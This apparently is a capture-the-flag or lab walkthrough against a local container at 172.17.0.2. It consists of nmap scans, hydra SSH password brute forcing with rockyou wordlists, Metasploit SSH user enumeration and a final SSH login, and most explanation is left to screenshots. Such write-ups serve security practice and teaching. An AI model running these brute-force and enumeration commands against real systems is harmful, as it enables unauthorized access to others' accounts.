![image](https://github.com/user-attachments/assets/4de9d2bc-19ef-4f7b-9ee4-b4b76df7090a)
```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p22 172.17.0.2 -oN targeted
```
![Pasted image 20250116134922](https://github.com/user-attachments/assets/2ea97704-fdce-4667-803b-925657edbcf5)
![Pasted image 20250116134941](https://github.com/user-attachments/assets/fa33866c-bb33-418b-b8a7-f21e86cad74e)
![Pasted image 20250116134958](https://github.com/user-attachments/assets/c40ab4ca-630f-440d-abda-2daeda6ad1f1)

## **we only have port 22 open so we will apply brute force**
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10 -I
```
![Pasted image 20250116142021](https://github.com/user-attachments/assets/3b8b64a1-a8c8-49ba-bb09-74c75d6d1ff1)
![Pasted image 20250116145839](https://github.com/user-attachments/assets/f20cc419-8a2e-4d48-88b8-3a849579a28b)

## **we have a password but no users so we will see if we can find an exploit that will help us.**

![Pasted image 20250116143431](https://github.com/user-attachments/assets/afaa4cb7-e041-4d25-b885-10efb27d80d3)

```bash
sudo msfdb init && msfconsole
```
```msf6
use auxiliary/scanner/ssh/ssh_enumusers
show options
set RHOSTS 172.17.0.2
set USER_FILE /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
run
```
![Pasted image 20250116144754](https://github.com/user-attachments/assets/f6458185-6fa5-4e64-b8da-d0e31c18e71e)

## **now we already have some users let's try to look for possible passwords for users**
```bash
hydra -l lovely -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
![Pasted image 20250116144856](https://github.com/user-attachments/assets/ec5e34f6-2150-41c4-918e-bb65143639c4)

```bash
ssh lovely@172.17.0.2
```













